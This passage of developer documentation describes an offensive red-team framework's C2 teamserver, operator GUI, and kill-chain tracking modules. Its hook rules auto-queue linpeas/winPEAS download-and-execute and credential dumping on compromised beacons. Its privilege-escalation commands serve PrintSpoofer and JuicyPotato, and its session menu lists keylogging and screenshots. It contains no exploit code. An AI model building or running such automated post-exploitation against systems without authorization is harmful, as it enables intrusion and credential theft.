## 15d. Multi-operator collaboration — `collab_bp`

`modules/collab_bp.py` — Flask blueprint, real-time team server. Classes: `EventBus` (SSE pub/sub, replays last 20), `LockManager` (advisory per-target locks w/ TTL), `OperatorRegistry` (> 90s no heartbeat → inactive), `ColabEvent` (value object). Broadcast via `publish_event(type, payload, operator)`. Endpoints: `/collab/` (GET dashboard), `/collab/stream` (SSE), `/collab/operators`, `/collab/publish` (POST), `/collab/lock`/`/unlock` (POST), `/collab/history` (GET). Config injection via `current_app.config.get("LAZYOWN_CONFIG")`. Tests: `tests/test_collab_and_onboarding.py` (67 tests).

## 15e. Onboarding — `QUICKSTART.md` + `wizard`

`QUICKSTART.md`: canonical operator onboarding (manual). `cli/wizard.py`: DIP design — never imports `lazyown.py`/`lazyc2.py`. Takes `params: dict` + `save: Callable`. Auto-detects `lhost` from routing table. Run: `wizard` or `wizard --check`. Auto-launched when `rhost` unset.

## 15f. Release — `DEPLOY.sh`

Rebuilds `README.md` from `UTILS.md`+`COMMANDS.md`+`CHANGELOG.md`, regenerates `docs/index.html`, bumps `version.json`, signed commit+tag, GH release. Non-interactive: `printf "1\nfeat\nsubject\nbody\n" | bash DEPLOY.sh --no-test`. Bump: `feat/feature/fix/hotfix`=patch; `refactor/docs/test/style`=none; `release`=major.

## 15g. Branching strategy (law)

Three-branch model: `dev` (active), `pp` (staging/QA), `main` (release). Flow: `feature/*` → `dev` → `pp` → `main`. Hotfix: branch from `main`, PR to `main`, back-merge to `pp` and `dev`. Agents work on `dev`.

## 15h. claude_md_orchestrator skill

`skills/claude_md_orchestrator/` — SDD+TDD+BDD cycle. Reads CLAUDE.md, walks contracts through: sdd_agent → tdd_agent → bdd_agent → reviewer_agent → documentation_agent → cicd_agent. Persists to `state.json`. Tests: `skills/claude_md_orchestrator/tests/`.

## 15i. LLM budget cap

`core/llm_budget.py` — daily cost cap + per-call token cap via proxy wrapping. Budget config keys: `llm_daily_budget_usd` (default 1.0), `llm_per_call_token_cap` (8000), `llm_budget_enabled` (true), `llm_reset_at_utc` (00:00), `llm_model_prices` (per-model USD/1M tokens). Persists spend to `sessions/llm_budget.json`. CLI: `llm_budget` / `llm_budget json` / `llm_budget reset`. MCP: `lazyown_get_llm_budget`. Tests: `tests/test_llm_budget.py`.

## 15j. LazyGUI — v2.0 Operator Console (PySide6 Desktop App)

**Package:** `lazygui/` (entry: `python -m lazygui`)
**Test suite:** `tests/test_lazygui_models.py`, `tests/test_lazygui_backend.py`, `tests/test_lazygui_graph_widget.py` (103 tests)

### Architecture

```
QApplication -> Application -> MainWindow
    ├── Backend (abstract) -- signals: status_changed, terminal_output,
    │       sessions_changed, listeners_changed, topology_changed,
    │       dashboard_updated, beacon_result, campaign_changed
    ├── LocalPtyBackend  -- PTY fork "bash run"
    └── TeamserverBackend -- HTTP REST + Socket.IO to lazyc2.py
────
├── GraphPanel -- Cobalt Strike-style topology (QGraphicsView, force layout)
├── SessionsPanel -- beacon list with right-click context menu (spawn shell,
│       port scan, screenshot, keylog, migrate, download/upload, kill)
├── ListenersPanel -- listener table
├── KillChainPanel -- 8-phase kill-chain progress bar
├── CredentialsPanel -- creds, hashes, loot
├── MarketplacePanel -- YARA rules + Nuclei templates + tools (tabbed)
├── CampaignPanel -- active campaigns with objective tracking
├── CVEPanel -- CVE knowledge base with severity filter
├── TerminalPanel -- ANSI terminal emulator
└── EventLogPanel -- ring buffer event log (5000 records)
────
├── 6 themes: tactical_green (default), tokyo_night, catppuccin_mocha,
│       gruvbox_dark, cobalt_clone, solarized_light
└── Keyboard: Ctrl+K palette, Ctrl+Shift+T cycle theme, Ctrl+1-5 panels
```

### Backend communication contracts

`TeamserverBackend` connects to `lazyc2.py` via:

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/data` | GET | Sessions, listeners, operator (poll 2000ms) |
| `/api/dashboard` | GET | Aggregated beacon count, events, facts |
| `/api/surface_live` | GET | Attack surface graph topology (nodes + edges) |
| `/api/listeners` | GET | C2 listener management |
| `/api/run` | POST | Global shell command |
| `/issue_command` | POST | Beacon-scoped command |
| `/api/output` | GET | Global command stdout |
| `/get_results` | GET | Beacon result cache |
| `/socket.io/` /pty | WS | PTY terminal I/O (real-time) |
| `/socket.io/` /terminal | WS | Beacon terminal I/O |
| `/socket.io/` / | WS | Default command/output channel |

### Domain models

- `GraphNode` — identifier, label, node_type, shape, color, icon, metadata
- `GraphEdge` — source_id, target_id, label, edge_type, color
- `Topology` — nodes sequence + edges sequence (empty sentinel)
- `BeaconResult` — client_id, output, command, OS, hostname, user, IPs
- `DashboardPayload` — beacon_count, events, campaign_state, facts_count
- `CampaignSummary` — identifier, name, status, playbook, objectives
- `Session`, `Listener`, `Operator`, `EventRecord` (unchanged from v1)

### Testing contract

All tests follow SDD+TDD+BDD. Mutation coverage required for new contracts.
Run: `python3 -m pytest tests/test_lazygui_*.py -v`

### Adding a new panel

1. Create `lazygui/panels/<name>_panel.py` — subclass `PanelBase`
2. Add to `lazygui/panels/registry.py` — field + `build()` constructor call
3. Add to `lazygui/panels/__init__.py` — imports
4. Wire in `lazygui/windows/main_window.py` — `_install_layout()` + shortcuts
5. Add tests in `tests/test_lazygui_*.py`

---

## 16. Killchain Gap Contracts (v3 — unified killchain)

Closing the gap between kill-chain phases so suggesters are effective and friction is eliminated. Each file is a single contract.

### `modules/killchain.py` — Single Source of Truth for Kill-Chain (NEW v3)

**Contract:** ``KillChain`` is the canonical authority for kill-chain data. Every display surface (CLI, Flask dashboard, GUI2, Textual TUI, tips engine, recommendation signals, MCP) imports from here. No other file defines its own phases.

**Key types:**
- ``KillChainConfig`` — Centralised constants: ``phases`` (8-tuple), ``phase_labels``, ``phase_colors`` (hex), ``phase_rich_colors``, ``engagement_to_cli`` mapping, ``cli_to_host_state`` mapping, ``compact_phases`` (5-tuple).
- ``PhaseStatus`` — Immutable ``(key, label, color, status)`` tuple for UI renderers.
- ``KillChain`` — Stateless class: ``current_phase()``, ``advance_phase()``, ``get_progress()``, ``phases_for_display()``.

**Phase resolution order:**
1. ``WorldModel.get_phase()`` (host states — canonical).
2. Raw JSON ``current_phase`` (operator override, only when higher rank).
3. Raw JSON ``phase`` (legacy fallback).
4. ``"recon"`` as safe default.

**``advance_phase()``** atomically writes ``current_phase``, ``phase``, and ``completed_phases`` into ``world_model.json`` AND advances all WorldModel hosts to the matching ``HostState``. Called by CLI ``phase`` command, C2 beacon handler, and autonomous daemon.

**6 consumers refactored:** ``cli/ops_commands.py``, ``modules/kill_chain_viz.py``, ``cli/killchain.py``, ``lazygui/panels/killchain_panel.py``, ``cli/tips_engine.py``, ``cli/dashboard_tui.py``.

**Tests:** ``tests/test_killchain_unified_v2.py`` (33 tests, 10/10 mutants killed).

### `lazygui/services/teamserver_backend.py` — Auto-Poll Beacon Results (NEW v3)

**Contract:** ``_results_timer`` polls ``/get_results`` every 3s. On new or changed output, emits ``beacon_result`` signal to ``TerminalPanel`` and ``BeaconCommandModal``.

**New timing constant:** ``beacon_results_poll_interval_ms: int = 3000``.

**Dead code removed:** ``_http_post_json()``, ``_post_global_command()``, ``_poll_command_output()`` (never called). Also removed ``read_and_forward_pty_output_c2()`` from ``lazyc2.py`` and commented-out shellcode form from ``templates/nav.html``.

### `lazygui/widgets/beacon_command_modal.py` — Beacon Command Modal (NEW v3)

**Contract:** ``Ctrl+J`` or ``File > Beacon Command`` opens a modal with beacon selector, command input, history list, and output viewer. Auto-updates via ``beacon_result`` signal.

### `cli/tips_engine.py` — Full Killchain Auto-Display (NEW v3)

**Contract:** After ``lazynmap``, ``auto_populate``, ``auto_pwn``, ``hunt``, or ``pwntomate``, shows the full killchain progress bar via ``_print_phase()`` (not just the compact 5-phase bar). Defined in ``_FULL_KILLCHAIN_TRIGGERS``.

### `modules/world_model.py` — Engagement State Tracking

**Contract:** Persist host states (UNSCANNED → OWNED), credentials, vulnerabilities, and network graph. Derive engagement phase from aggregate host states. Thread-safe with RLock.

**New methods (v2):**
- `set_os_hint(ip, os_hint)` — Set OS hint for a host (auto-called by C2 on beacon connect and by `do_ping`).
- `get_host(ip)` → `HostEntry | None` — Query a single host entry.
- `get_hosts_summary()` → `dict[str, str]` — IP → state mapping for all hosts.

**Phase derivation:** `max(host.state)` → engagement phase. All OWNED → COMPLETE.

**Tests:** `tests/test_world_model_extended.py` (7 tests)

### `modules/conditional_hooks.py` — Beacon Automation Triggers

**Contract:** Match events against operator-defined rules and execute actions (run_command, run_local, notify, credential_reuse_check). Supports platform filtering and cooldown.

**New in v2:**
- `_contains` suffix keys for substring matching (case-insensitive).
- Case-insensitive exact matching for string trigger values.
- Case-insensitive list matching.
- `run_local` action type — executes commands on the C2 server (subprocess).
- Hook action handler wiring in `lazyc2.py` — queues beacon commands via `cmd_<client_id>.json`.

**New default rules:**
| Rule | Trigger | Action |
|------|---------|--------|
| `auto-privesc-on-beacon-linux` | beacon_connected + linux | Queues linpeas download+exec |
| `auto-privesc-on-beacon-windows` | beacon_connected + windows | Queues winPEAS download+exec |
| `auto-crystal-ball-on-peas-output` | command_executed containing linpeas | Notifies to run crystal_ball |
| `auto-crystal-ball-on-winpeas-output` | command_executed containing winpeas | Notifies to run crystal_ball |
| `auto-loot-on-owned` | host_owned | Queues lazydump + netstat + arp |

**Tests:** `tests/test_conditional_hooks_extended.py` (11 tests)

### `cli/recommendation_signals.py` — KillchainGapSignal

**Contract:** `KillchainGapSignal` inspects `world_model.json` host states and detects missing steps in the kill chain. Returns `Proposal` objects with high confidence (0.85-0.95 weight).

**Gap detection rules:**
| Condition | Recommendation | Category |
|-----------|---------------|----------|
| Host EXPLOITED, no privesc | linpeas / winpeas (OS-aware) | privesc |
| Host OWNED, no credentials | lazydump | cred |
| Scan exists, no enumeration | gobuster | enum |
| Credentials exist, no lateral | crackmapexec | lateral |

**Weight:** 0.8 in `EngineWeights.signal_weights` (second only to RECON at 1.0).

**Tests:** `tests/test_killchain_gap_signal.py` (12 tests)

### `cli/tips_engine.py` — Phase Derivation + OS Hint (v3 refactored)

**Contract:** ``_resolve_phase()`` now derives phase from ``modules.killchain.KillChain.current_phase()`` as canonical source. ``_read_os_id_from_session()`` reads OS from ``sessions/os.json`` as fallback when ``payload.json`` has no ``os_id``. ``_derive_phase_from_hosts()`` removed (dead code — replaced by KillChain).

**New methods:**
- ``_read_os_id_from_session()`` — Reads ``os.json`` for Linux/Windows detection.
- ``_render_killchain_progress()`` — Compact killchain progress bar ``[R>E>X>P>L]``.
- ``_maybe_show_full_killchain(cmd)`` — Shows full killchain after ``lazynmap``, ``auto_populate``, ``auto_pwn``, ``hunt``, ``pwntomate``.
- ``_check_badges()`` — ``first_owned`` badge when world_model contains OWNED hosts.

### `lazyc2.py` — World Model + Killchain Advancement on Beacon Events (v3 refactored)

**Contract:** On ``beacon_connected`` → advance host to ``EXPLOITED`` + call ``KillChain.advance_phase("exploit")``. On privesc detection (uid=0/root/System) → advance to ``OWNED`` + call ``KillChain.advance_phase("privesc")`` + fire ``host_owned`` event.

**Detection patterns:** ``uid=0(root)``, ``NT AUTHORITY\SYSTEM``, ``user == "root"``.

**Dead code removed:** ``read_and_forward_pty_output_c2()`` (never started as background task).

### `cli/commands/privilege_escalation.py` — New Commands

| Command | Purpose |
|---------|---------|
| `whoami_priv` | OS-aware privilege enumeration (id, sudo -l, whoami /priv) |
| `sudo_privesc` | Analyse sudo -l output with GTFOBins parquet |
| `printspoofer` | Serve PrintSpoofer64.exe over HTTP |
| `juicypotato` | Serve JuicyPotato.exe over HTTP |

### `cli/reactive_hints.py` — Updated Tables

`_KILL_CHAIN_NEXT` extended with entries for `whoami_priv`, `sudo_privesc`, `printspoofer`, `juicypotato`, `crystal_ball`.
`_PHASE_PRIORITY["privesc"]` includes all new commands.

### `cli/command_chain.py` — Updated Prerequisites

Added prerequisites: `whoami_priv:(ssh,)`, `crystal_ball:(linpeas,)`, `printspoofer:(evil-winrm,)`, `juicypotato:(evil-winrm,)`.

### `cli/tips_engine.py` — Updated ELO Table

ELO bonuses: `juicypotato:20`, `sudo_privesc:20`, `whoami_priv:10`, `crystal_ball:18`.

---

## 17. Read next

- `QUICKSTART.md` — start here for a new operator session.
- `README.md` — public feature list (auto-regenerated by `DEPLOY.sh`).
- `COMMANDS.md` — every CLI command (auto-generated).
- `UTILS.md` — `utils.py` reference (auto-generated).
- `CHANGELOG.md` — release history.
- `skills/lazyown.md` — MCP playbook (mandatory before MCP session).
- `skills/README.md` — skills architecture + 148 MCP tools.
- `<dir>/README.md` — every directory; read before editing.

When in doubt: read `payload.json` → `sessions/` → directory's `README.md` → then write code.
